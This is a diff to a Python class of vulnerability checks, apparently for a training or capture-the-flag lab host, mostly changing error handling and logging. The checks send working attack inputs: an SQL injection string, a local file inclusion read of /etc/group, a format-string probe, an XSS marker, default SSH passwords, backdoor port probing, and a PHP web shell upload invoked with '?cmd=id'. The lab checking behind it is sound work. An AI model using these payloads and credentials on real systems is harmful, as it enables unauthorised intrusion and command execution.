@@ -18,7 +18,7 @@ class test_vulns():
             results = conn.recv()
         except:
             log.info("Error connecting to "+ ip)
-            return False
+            return None
         log.debug(results)
         conn.close()
         if "jackbauer" in results:
@@ -44,8 +44,8 @@ class test_vulns():
             results = ""
             results = conn.recv()
         except:
-            log.info("Error connecting to"+ ip)
-            return False
+            log.info("Error connecting to "+ ip)
+            return None
         conn.close()
         log.debug(results)
         if "-11" in results:
@@ -68,7 +68,7 @@ class test_vulns():
             results = shell["whoami"]
         except:
             log.info("Failed to connect to ssh " + ip)
-            return False
+            return None
         log.debug(results)
         shell.close()
         if username in results:
@@ -84,7 +84,7 @@ class test_vulns():
         but the backdoor port will decrement after each successful connection
         @param ip: ip address of target
         """
-        for i in range(33123, 33103, -1):
+        for i in range(33123, 33083, -1):
             port = i
             try:
                 conn = remote(ip, port)
@@ -110,7 +110,7 @@ class test_vulns():
             results = wget(url)
         except:
             log.info("Error connecting to backdoor 2 " + ip)
-            return False
+            return None
         if "www-data" in results:
             log.info(ip+" VULNERABLE to backdoor 2")
             return True
@@ -125,11 +125,12 @@ class test_vulns():
         @param ip: ip address of target
         """
         url = "http://" + ip + "/lfi/lfi.php?language=/etc/group"
+        results = ""
         try:
             results = wget(url)
         except:
             log.info("Error performing web request to ")
-            return False
+            return None
         if "surnow" in results:
             log.info(ip+" VULNERABLE to lfi")
             return True
@@ -137,7 +138,7 @@ class test_vulns():
             log.info(ip+" NOT VULNERABLE to lfi")
             return False
 
-    def test_local_format_string(self, ip, username, pw):
+    def test_local_format_string(self, ip, username, pw, keyfile=None):
         """
         Test for local format string vulnerability. This can be accessed by jackbauer, chloe, and surnow.
         To verify this vulnerability we can check to see if we can read data off of the stack
@@ -145,11 +146,18 @@ class test_vulns():
         @param username: username to login with over ssh
         @param pw: password to login with over ssh
         """
-        try:
-            shell = ssh(username, ip, password=pw)
-        except:
-            log.info("Failed to connect to local format string "+ ip)
-            return False
+        if keyfile: 
+            try:
+               shell = ssh(username, ip, keyfile=keyfile)
+            except:
+               log.info("Failed to connect to local format string with key " + ip) 
+               pass
+        if not shell:
+            try:
+                shell = ssh(username, ip, password=pw)
+            except:
+                log.info("Failed to connect to local format string "+ ip)
+                return False
         results = ""
         results = shell["/home/jackbauer/services/c/formatme_local/printf %x%x%x"]
         evaluation = re.match("[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]", results)
@@ -172,9 +180,9 @@ class test_vulns():
         try:
             results = wget(url)
         except:
-            log.info("Error reflected XSS " + ip)
-            return False
-        log.info(results)
+            log.info("Failed to connect to reflected XSS " + ip)
+            return None
+        log.debug(results)
         if "<img src=x onerror=alert(1)>" in results:
             log.info(ip+" VULNERABLE to reflected xss")
             return True
@@ -187,53 +195,72 @@ class test_vulns():
         Test for SQL injection (SQLi)
         @param  ip: ip address of target
         """
-        log.info("testing sqli on " + ip)
+        log.debug("testing sqli on " + ip)
+        results = ""
         #payload = {'codename_input':'B-Rabbit', 'submitted':'TRUE'}
+        #create SQL injection payload
         payload = {'codename_input':'a" or 2 LIKE 2-- ', 'submitted':'TRUE'}
         url = "http://" + ip + "/index.php"
         try:
             results = requests.post(url, data=payload)
-            log.info(results.text)
-        except:
-            log.info("Failed to connect to sqli " + ip)
-            return False
+            log.debug(results.text)
+        except: 
+            log.info("Failed to connect to sqli " + ip) 
+            return None 
         if "Tibet" in results.text:
             return True
-        else:
+        else: 
             return False
-
+        
     def test_local_format_string_chloe(self, ip):
-        self.test_local_format_string(ip, "chloe", "chloechloe")
-
+        """
+        Test local format string vulnerability as chloe user
+        """
+        self.test_local_format_string(ip, "chloe", "chloechloe", keyfile="id_rsa")
+ 
     def test_dom_based_xss(self, ip):
+        """
+        Test for dom based XSS
+        @param ip: ip address of target
+        """
         log.info("testing dom based xss")
         url = "http://" + ip + "/dom_based_xss/index.html"
-        try:
+        try: 
             results = wget(url)
-            log.info(results)
         except:
-            log.info("Failed to connect to " + ip)
+            log.info("Failed to connect to " + ip) 
+            return None
+        if not results:
+            return False
+
         if 'document.write("<a href=" + decodeURIComponent(document.baseURI)' in results:
             log.info(ip + " VULNERABLE to dom based XSS")
             return True
         else:
-            return False
+            return False 
 
     def test_arbitrary_file_upload(self, ip):
-        log.info("testing arbitrary file upload ")
+        """
+        Test for arbitrary file upload. This function requires the existance of a local file called hacker_shell.php
+        @param ip: ip address of target
+        """
         url = "http://" + ip + "/arbitrary_file_upload/upload.php"
-        files = {'image': open('hacker_shell.php', 'rb')}
         try:
-            results = requests.post(url, files=files)
-            log.info(results.text)
+            hacker_shell = open('hacker_shell.php', 'rb')
         except:
-            return False
+            log.info("Falied to open local file on server. Make sure hacker_shell.php is in current working directory")
+            return None
+        files = {'image': hacker_shell}
+        try: 
+            results = requests.post(url, files=files)
+        except:
+            log.info("Failed to connect to " + ip)
+            return None
         url2 = "http://" + ip + "/arbitrary_file_upload/images/hacker_shell.php?cmd=id"
         try:
             results2 = requests.get(url2)
-            log.info(results2.text)
         except:
-            return False
+            return None 
         if "www-data" in results2.text:
             log.info(ip+" VULNERABLE to arbitrary file upload")
             return True
@@ -250,9 +277,6 @@ class test_vulns():
     def test_ssh_surnow(self, ip):
         return self.test_ssh_default(ip, "surnow", "surnowsurnow")
 
-    def check_service(self, ip):
-        return True
-
 
 if __name__ == "__main__":
     ip_addr = "192.168.3.117"
@@ -267,7 +291,9 @@ if __name__ == "__main__":
     t.test_ssh_chloe(ip_addr)
     t.test_ssh_surnow(ip_addr)
     t.test_backdoor_1(ip_addr)
+    t.test_backdoor_2(ip_addr)
     t.test_lfi(ip_addr)
     t.test_local_format_string_chloe(ip_addr)
     t.test_reflected_xss(ip_addr)
+
 
